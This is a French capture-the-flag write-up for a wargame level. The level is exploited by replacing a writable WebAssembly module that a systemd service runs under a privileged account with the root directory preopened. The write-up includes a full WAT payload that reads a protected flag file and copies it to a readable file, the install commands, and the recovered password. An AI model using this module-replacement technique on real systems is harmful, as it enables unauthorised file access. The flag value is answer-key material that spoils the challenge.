# Level05 — Exploiter un module WebAssembly modifiable

## Objectif

Comprendre qu’un module WebAssembly modifiable devient dangereux lorsqu’un service le lance avec une identité plus privilégiée et lui donne accès au système de fichiers.

Le niveau peut se résumer ainsi :

```text
level05 modifie un module WASM
          │
          ▼
le service l’exécute comme flag05
          │
          ▼
WASI lui donne accès à /
          │
          ▼
le module lit le flag et l’écrit dans un fichier lisible
```

## 1. Identifier son environnement

```bash
whoami
id
ls -la
```

`whoami` indique le compte utilisé, `id` affiche ses groupes et `ls -la` montre le contenu du dossier courant. La lecture du README n’étant pas possible ici, on part du nom du compte `level05` pour poursuivre la recherche.

## 2. Trouver les fichiers du niveau

Commencer par chercher le nom du niveau actuel :

```bash
find / -iname '*level05*' 2>/dev/null
```

Une piste à vérifier parmi les résultats est le dossier `/opt/snowcrash/level05`. Examiner son contenu :

```bash
ls -la /opt/snowcrash/level05
```

Si la liste contient `metaverse.wasm`, identifier sa nature :

```bash
file /opt/snowcrash/level05/metaverse.wasm
```

Les notes de résolution présentent ce fichier comme un module WebAssembly. La sortie exacte de `find`, de `ls` et de `file` reste à confirmer sur la VM.

## 3. Vérifier que le module est modifiable

```bash
id
ls -l /opt/snowcrash/level05/metaverse.wasm
```

Ces deux commandes doivent être lues ensemble :

- `id` liste les groupes de `level05` ;
- `ls -l` donne le propriétaire, le groupe et les droits du module.

Les notes de résolution indiquent que `level05` appartient au groupe `metaverse` et que ce groupe peut modifier `metaverse.wasm`. Les sorties exactes de `id` et de `ls -l` restent à relever sur la VM pour vérifier ces droits.

À ce stade, nous savons seulement que `level05` contrôle le code du module. Cela ne suffit pas encore à lire `/home/flag05/.flag` : il faut savoir **qui exécute ce module** et **quels fichiers il peut atteindre**.

## 4. Trouver le service qui exécute le module

Le nom `metaverse.wasm` donne le mot-clé de recherche du service :

```bash
systemctl list-unit-files --all | grep -i metaverse
```

Le service identifié est `metaverse.service`. Lire sa définition :

```bash
systemctl cat metaverse.service
```

Dans cette sortie, chercher les informations suivantes :

- `User=` : quelle identité exécute le service ? Les notes indiquent `flag05`.
- `ExecStart=` : quelle commande est lancée ? Examiner aussi tout script qu’elle pourrait appeler avant de conclure quel module et quelles options sont utilisés.

Les notes indiquent que Wasmtime exécute `metaverse.wasm` avec la racine `/` préouverte. Si la commande effective contient `--dir=/`, cette option rend la racine accessible au module via WASI, sous réserve des permissions de l’utilisateur du service. La sortie exacte du service et, s’il y en a un, le contenu du script appelé restent à relever sur la VM.

Si le service est exécuté par un timer, le repérer pour savoir quand le module sera relancé :

```bash
systemctl list-timers --all | grep -i metaverse
```

La chaîne suivante résume les observations rapportées ; il reste à les vérifier à l’aide des commandes ci-dessus :

```text
level05 peut remplacer metaverse.wasm
                 │
                 ▼
metaverse.service le lance sous flag05
                 │
                 ▼
Wasmtime préouvre /
                 │
                 ▼
le module peut demander l’ouverture de home/flag05/.flag
```

## 5. Les termes utiles : WASM, WAT et WASI

| Terme | À retenir pour ce niveau |
| --- | --- |
| WASM | Le format binaire exécuté par le service : `metaverse.wasm`. |
| WAT | La version textuelle et lisible d’un module WebAssembly. C’est le format dans lequel nous écrivons le payload. |
| `wat2wasm` | L’outil qui convertit le fichier WAT en fichier WASM. |
| WASI | L’interface par laquelle un module WASM peut demander des opérations telles que l’ouverture ou la lecture d’un fichier. |
| Wasmtime | Le programme qui exécute le module et applique les autorisations WASI définies par le service. |

Un module WASM n’a pas accès aux fichiers par défaut. D’après les notes, Wasmtime lui ouvre ici l’accès à `/` : il faut confirmer l’option exacte dans la commande effective. Le point faible décrit par la solution associe un module modifiable, l’identité `flag05` et une racine préouverte trop large.

## 6. Comprendre le but du payload avant son code

Un **payload** est le programme que nous choisissons de faire exécuter pour obtenir le résultat recherché. Ici, `level05` ne peut pas lire directement le flag. La solution consiste à remplacer le module utilisé par le service par notre propre module : lors du prochain lancement, ses instructions seront exécutées avec les droits du service.

Le fichier [payload.wat](payload.wat) est la version lisible de ce programme. Son but tient en quatre actions :

```text
1. ouvrir home/flag05/.flag
2. lire le flag dans la mémoire du module
3. ouvrir opt/snowcrash/level05/x
4. recopier le flag dans x
```

Les chemins sont relatifs à `/`, le répertoire préouvert par Wasmtime. C’est pourquoi ils ne commencent pas par une barre oblique dans le WAT :

```text
home/flag05/.flag          → /home/flag05/.flag
opt/snowcrash/level05/x    → /opt/snowcrash/level05/x
```

La longueur du payload ne vient pas de ces quatre idées simples. Elle vient du fait que WASI demande au programme de fournir explicitement les adresses mémoire de ses chaînes, de ses tampons et de ses résultats.

## 7. Lire le payload par étapes

Le code ci-dessous reprend intégralement [payload.wat](payload.wat). Les explications après `;;` sont des commentaires : elles ne changent pas le comportement du programme.

Pour le lire, il faut connaître trois choses :

- WebAssembly utilise une **pile de valeurs** : `i32.const 64` place le nombre `64` sur la pile ; une instruction ou une fonction le récupère ensuite. `i32` et `i64` désignent des entiers de 32 et 64 bits.
- Un **descripteur** est un numéro que le programme utilise pour désigner un fichier ouvert. Une **adresse** est un emplacement dans la mémoire du module : ce sont deux choses différentes, même si elles sont représentées par des nombres.
- `i32.store` prend une adresse puis une valeur sur la pile et écrit la valeur à cette adresse ; `i32.load` lit la valeur enregistrée à l’adresse placée sur la pile.

```wat
(module  ;; Début du module WebAssembly.

  ;; Demander à WASI la fonction qui ouvre un fichier.
  (import "wasi_snapshot_preview1" "path_open"
    ;; Neuf arguments : emplacement du chemin, droits demandés, etc.
    ;; Le résultat i32 est un code d’erreur : 0 signifie succès.
    (func $path_open (param i32 i32 i32 i32 i32 i64 i64 i32 i32) (result i32)))

  ;; Demander la fonction qui lit un fichier dans la mémoire du module.
  (import "wasi_snapshot_preview1" "fd_read"
    (func $fd_read (param i32 i32 i32 i32) (result i32)))

  ;; Demander la fonction qui écrit la mémoire du module dans un fichier.
  (import "wasi_snapshot_preview1" "fd_write"
    (func $fd_write (param i32 i32 i32 i32) (result i32)))

  (memory (export "memory") 1)  ;; Réserver et exposer une page de 65 536 octets.
  (data (i32.const 0) "home/flag05/.flag")  ;; Placer le chemin source à l’adresse 0.
  (data (i32.const 32) "opt/snowcrash/level05/x")  ;; Chemin de sortie à l’adresse 32.

  (func (export "_start")  ;; Point d’entrée : le runtime commence ici.

    ;; 1. Ouvrir le flag en lecture avec path_open.
    ;; Les neuf valeurs sont placées sur la pile dans l’ordre des arguments.
    i32.const 3   ;; Descripteur supposé du répertoire préouvert : /.
    i32.const 0   ;; Options de résolution du chemin : aucune.
    i32.const 0   ;; Adresse du chemin source dans la mémoire.
    i32.const 17  ;; Longueur du chemin source en octets.
    i32.const 0   ;; Options d’ouverture : ne pas créer ni tronquer.
    i64.const 2   ;; Droit WASI demandé : lecture du fichier.
    i64.const 0   ;; Droits héritables demandés : aucun.
    i32.const 0   ;; Options du descripteur : aucune.
    i32.const 80  ;; Adresse où WASI enregistrera le descripteur obtenu.
    call $path_open  ;; Appeler WASI avec ces neuf arguments.
    drop             ;; Retirer le code d’erreur sans le vérifier.

    ;; 2. Préparer l’iovec : une description du tampon de lecture.
    i32.const 64   ;; Adresse où enregistrer le début du tampon.
    i32.const 128  ;; Le tampon lui-même commence à l’adresse 128.
    i32.store      ;; Écrire 128 à l’adresse 64.

    i32.const 68  ;; Adresse où enregistrer la taille du tampon.
    i32.const 64  ;; Le tampon peut recevoir au maximum 64 octets.
    i32.store     ;; Écrire la taille 64 à l’adresse 68.

    i32.const 72  ;; Adresse réservée au nombre d’octets lus.
    i32.const 0   ;; Valeur initiale : zéro.
    i32.store     ;; Écrire 0 à l’adresse 72.

    ;; 3. Lire le flag dans le tampon.
    i32.const 80  ;; Adresse qui contient le descripteur du fichier source.
    i32.load      ;; Charger ce descripteur pour le passer à fd_read.
    i32.const 64  ;; Adresse de l’iovec : il décrit le tampon.
    i32.const 1   ;; Nombre d’iovecs fournis : un seul.
    i32.const 72  ;; Adresse où WASI écrira le nombre d’octets lus.
    call $fd_read ;; Lire depuis le fichier source vers le tampon.
    drop          ;; Retirer le code d’erreur sans le vérifier.

    ;; 4. Ouvrir le fichier de sortie avec path_open.
    i32.const 3   ;; Descripteur supposé du répertoire préouvert : /.
    i32.const 0   ;; Options de résolution du chemin : aucune.
    i32.const 32  ;; Adresse du chemin de sortie dans la mémoire.
    i32.const 23  ;; Longueur du chemin de sortie en octets.
    i32.const 9   ;; Options WASI : créer si absent et tronquer si présent.
    i64.const 64  ;; Droit WASI demandé : écriture dans le fichier.
    i64.const 0   ;; Droits héritables demandés : aucun.
    i32.const 0   ;; Options du descripteur : aucune.
    i32.const 84  ;; Adresse où WASI enregistrera le descripteur de sortie.
    call $path_open  ;; Ouvrir le fichier de sortie.
    drop             ;; Retirer le code d’erreur sans le vérifier.

    ;; 5. Adapter la taille à la quantité réellement lue.
    i32.const 68  ;; Adresse où se trouve la taille de l’iovec.
    i32.const 72  ;; Adresse qui contient le nombre d’octets lus.
    i32.load      ;; Charger ce nombre.
    i32.store     ;; Le copier à l’adresse 68 à la place de 64.

    ;; 6. Écrire le contenu du tampon dans le fichier de sortie.
    i32.const 84   ;; Adresse qui contient le descripteur de sortie.
    i32.load       ;; Charger ce descripteur pour le passer à fd_write.
    i32.const 64   ;; Adresse de l’iovec : tampon et nouvelle taille.
    i32.const 1    ;; Nombre d’iovecs fournis : un seul.
    i32.const 76   ;; Adresse où WASI écrira le nombre d’octets écrits.
    call $fd_write ;; Écrire le contenu du tampon dans le fichier de sortie.
    drop           ;; Retirer le code d’erreur sans le vérifier.
  )  ;; Fin de la fonction _start.
)    ;; Fin du module.
```

Après une lecture réussie, le flag se trouve dans la mémoire à partir de l’adresse `128`. Sa longueur est enregistrée à l’adresse `72` puis copiée à l’adresse `68`, pour demander à `fd_write` de n’écrire que les octets effectivement lus.

Ce payload suppose que le descripteur `3` correspond à la racine préouverte. Il lit au maximum 64 octets, ignore les codes d’erreur et ne vérifie pas si l’écriture a été complète. La configuration du service reste à vérifier sur la VM.

## 8. Compiler et installer le module

Dans la session existante sous `level05`, créer `/tmp/payload.wat` et y coller le contenu exact de [payload.wat](payload.wat).

```bash
vi /tmp/payload.wat
```

Le fichier de sortie doit appartenir à `level05` et rester lisible après le passage du service. Le créer avant de lancer le service :

```bash
touch /opt/snowcrash/level05/x
chmod 666 /opt/snowcrash/level05/x
```

Compiler ensuite le WAT en WASM :

```bash
wat2wasm /tmp/payload.wat -o /tmp/payload.wasm
```

Puis remplacer le module traité par le service :

```bash
cat /tmp/payload.wasm > /opt/snowcrash/level05/metaverse.wasm
```

`cat` ne lance pas le programme : il remplace seulement le contenu du module que le timer exécutera plus tard.

## 9. Attendre le service puis lire le résultat

Après le prochain passage du timer, lire le fichier de sortie :

```bash
cat /opt/snowcrash/level05/x
```

Le secret récupéré est :

```text
viuaaale9huek52boumoomioc
```

L’apparition du flag dans `x` confirme les trois éléments du raisonnement : le module remplacé a été exécuté, il a bénéficié des droits de `flag05` et WASI lui a donné accès au chemin du flag.

## 10. Passer à `level06`

```bash
su - level06
```

Saisir le secret comme mot de passe, puis vérifier l’identité obtenue :

```bash
id -un
```

Résultat attendu : `level06`. Le passage au compte suivant a réussi avec la valeur récupérée, également conservée dans `level05/flag`.

## Pourquoi cette méthode fonctionne

`level05` ne peut pas lire directement `/home/flag05/.flag`. En revanche, il peut modifier le module que le service exécute. Le service donne ensuite à ce code les droits de `flag05` et l’accès WASI à `/`. Le module peut donc ouvrir le flag, le lire et le recopier dans `x`.

## À expliquer à l’évaluation

> J’ai trouvé un module WebAssembly modifiable par `level05`. Le service l’exécute sous `flag05` avec la racine préouverte via WASI. J’ai remplacé ce module par un programme WAT qui ouvre le flag, le lit en mémoire puis l’écrit dans un fichier accessible à `level05`.

## Traçabilité à conserver

Conserver les sorties de `find`, `ls -la`, `file`, `id`, `ls -l`, `systemctl list-unit-files`, `systemctl cat`, `systemctl list-timers`, `wat2wasm`, `cat x` et `id -un`.
